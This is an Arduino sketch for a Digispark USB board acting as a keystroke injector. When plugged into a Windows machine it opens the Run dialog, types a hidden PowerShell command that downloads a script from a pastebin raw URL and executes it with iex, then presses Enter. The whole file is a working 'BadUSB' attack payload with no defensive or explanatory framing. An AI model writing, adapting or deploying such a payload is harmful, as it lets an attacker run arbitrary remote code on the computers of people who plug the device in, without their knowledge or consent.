#include "DigiKeyboard.h"

void setup() {
  // don't need to set anything up to use DigiKeyboard
}


void loop() {
  // this is generally not necessary but with some older systems it seems to
  // prevent missing the first character after a delay:
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(50);
  DigiKeyboard.print(F("powershell -nop -c \"iex(New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/mt6YNjxJ')\""));
  DigiKeyboard.delay(50 );
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  for(; ; );
}
